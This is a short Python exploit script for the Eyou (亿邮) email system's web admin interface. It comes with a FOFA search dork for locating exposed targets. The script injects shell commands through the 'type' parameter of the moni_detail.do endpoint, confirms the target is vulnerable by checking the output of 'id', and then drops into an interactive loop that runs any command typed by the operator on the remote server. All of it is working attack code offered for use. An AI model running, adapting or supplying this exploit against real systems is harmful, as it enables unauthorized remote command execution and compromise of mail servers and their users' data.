#!/usr/bin/python3
#Author 陈tua
#fofa dork: app="亿邮电子邮件系统"
import requests
import sys
import re
from urllib3.exceptions import InsecureRequestWarning

if len(sys.argv)<2:
	print("请查看帮助手册")
	print("示例:python3 exp.py -h")
	exit()

if sys.argv[1]=="-h":
	print("示例:python3 exp.py -t https:127.0.0.1/")
	exit()

if sys.argv[1]=="-t":
	url=sys.argv[2]+"/webadm/?q=moni_detail.do&action=gragh"

def get(url):

	requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
	headers = {
	                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.170 Safari/537.36"
	            }
	rew = requests.get(url=url,headers = headers,verify = False,timeout = 5)
	return rew

def post(code):
	if code==200:
		print("Ready to attack")
		print(".................")
		print("=================================")
		data = "type='|id||'"
		headerss = {
	                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.170 Safari/537.36",
	                    "Content-Type": "application/x-www-form-urlencoded"
	            }

	res = requests.post(url,data = data,headers = headerss,verify = False,timeout = 5)
	re_text=re.match(r'<html>(.|\n)*</html>', res.text)
	repl_test=res.text.replace(re_text[0],"")
	return repl_test

def attck(c):
	if "gid" in c:
		print("[+]Target is vuln!")
		while True:
			num=input("")
			data="type='|"+num+"||'"
			requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
			headerss = {
		                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.170 Safari/537.36",
		                    "Content-Type": "application/x-www-form-urlencoded"
		            }
			res = requests.post(url,data = data,headers = headerss,verify = False,timeout = 5)
			re_text=re.match(r'<html>(.|\n)*</html>', res.text)
			repl_test=res.text.replace(re_text[0],"")
			print(repl_test)
	else:
		
		print("[-]Target is not vuln")

if __name__=="__main__":
	code =get(url)
	post =post(code.status_code)
	attck(post)

